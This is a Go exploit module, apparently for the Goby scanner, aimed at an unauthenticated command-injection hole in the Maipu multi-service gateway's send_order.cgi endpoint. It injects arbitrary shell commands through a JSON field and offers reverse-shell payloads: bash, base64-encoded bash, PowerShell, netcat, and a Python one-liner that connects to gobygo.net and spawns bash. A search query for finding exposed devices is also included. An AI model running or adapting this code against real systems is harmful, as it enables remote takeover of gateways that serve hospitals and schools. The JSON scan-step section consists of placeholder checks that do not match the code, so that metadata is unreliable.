package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Maipu Multi-Service Converged Gateway /send_order.cgi Command Execution Vulnerability",
    "Description": "<p>Maipu multi-service convergence gateway is a multi-service wireless convergence gateway independently developed by Maipu Communication Technology Co., Ltd., which has the functions of converged gateway, precise flow control, Internet behavior management, intelligent traffic steering... and other powerful functions, and supports docking with the Maipu cloud platform to achieve remote operation and maintenance and centralized management, which well meets the fully integrated network requirements of medical/education and other scenarios. </p><p> A command execution vulnerability exists at the send_order.cgi interface of the Maipu Multiservice Convergence Gateway, which can be exploited by an unauthenticated, remote attacker to execute arbitrary system instructions to obtain server shell privileges.</p>",
    "Product": "Maplexin-Tech-Co.,-Ltd.",
    "Homepage": "https://www.maipu.cn/",
    "DisclosureDate": "2024-07-31",
    "PostTime": "2024-07-31",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"迈普多业务融合网关\" && body=\"js/config.js\"",
    "GobyQuery": "title=\"迈普多业务融合网关\" && body=\"js/config.js\"",
    "Level": "3",
    "Impact": "<p>A command execution vulnerability exists in the send_order.cgi interface of the Maipu Multiservice Converged Gateway, which can be exploited by an unauthenticated, remote attacker to execute arbitrary system commands to gain server shell privileges.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "迈普多业务融合网关 /send_order.cgi 命令执行漏洞",
            "Product": "迈普通信技术股份有限公司",
            "Description": "<p>迈普多业务融合网关是迈普通信技术股份自主研发的多业务无线融合网关，拥有融合网关功能、精准流控、上网行为管理、智能选路…等强大功能，并支持对接迈普云平台，实现远程运维和集中管理，很好的满足了医疗/教育等场景要求的全面一体化的网络需求。<br></p><p>迈普多业务融合网关 send_order.cgi 接口处存在命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，从而获取服务器shell权限。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>迈普多业务融合网关 send_order.cgi 接口处存在命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，从而获取服务器shell权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "HW-2024",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Maipu Multi-Service Converged Gateway /send_order.cgi Command Execution Vulnerability",
            "Product": "Maplexin-Tech-Co.,-Ltd.",
            "Description": "<p>Maipu multi-service convergence gateway is a multi-service wireless convergence gateway independently developed by Maipu Communication Technology Co., Ltd., which has the functions of converged gateway, precise flow control, Internet behavior management, intelligent traffic steering... and other powerful functions, and supports docking with the Maipu cloud platform to achieve remote operation and maintenance and centralized management, which well meets the fully integrated network requirements of medical/education and other scenarios.&nbsp;</p><p>&nbsp;A command execution vulnerability exists at the send_order.cgi interface of the Maipu Multiservice Convergence Gateway, which can be exploited by an unauthenticated, remote attacker to execute arbitrary system instructions to obtain server shell privileges.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>A command execution vulnerability exists in the send_order.cgi interface of the Maipu Multiservice Converged Gateway, which can be exploited by an unauthenticated, remote attacker to execute arbitrary system commands to gain server shell privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "HW-2024",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10981"
}`
	setPayloadRequestHashdnscjeqnu7c2nuefh2bg3gy2fe := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulnUrl := "/send_order.cgi?parameter=operation"

		//配置POST请求
		makeRequest := httpclient.NewPostRequestConfig(vulnUrl)
		makeRequest.FollowRedirect = false
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		//设置请求头的写法，这个漏洞不需要
		//makeRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")

		//设置POST数据
		//将command中的"替换为\"
		command = strings.ReplaceAll(command, `"`, `\"`)
		makeRequest.Data = `{"opid":"1","name":";echo '';` + command + `;","type":"rest"}`

		//发送POST请求
		resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest)
		if err != nil || resp.StatusCode != 200 {
			return "", "", err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.RawBody

		return commandResult, vulnUrl, nil
	}

	randNumberString_csnancihacjyhbqhbcuu := func(n int) string {
		numberBytes := "0123456789"
		b := make([]byte, n)
		for i := range b {
			b[i] = numberBytes[rand.Intn(len(numberBytes))]
		}
		return string(b)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashdnscjeqnu7c2nuefh2bg3gy2fe
			// 随机生成16位随机数字
			text := randNumberString_csnancihacjyhbqhbcuu(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashdnscjeqnu7c2nuefh2bg3gy2fe

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := `echo '---start---';` + goutils.B2S(ss.Params["cmd"]) + `;echo '---end---'`
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					// //获取响应结果
					re, err := regexp.Compile(`(?i)---start---\n((.|\n)*?)\n---end---`)
					// //检查是否有匹配到内容
					if !re.MatchString(Result) {
            expResult.Success = false
            expResult.Output = err.Error()
						return expResult
					}
					match := re.FindStringSubmatch(Result)
					if len(match) > 1 {
						Result = match[1]
					} else {
						Result = match[0]
					}
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
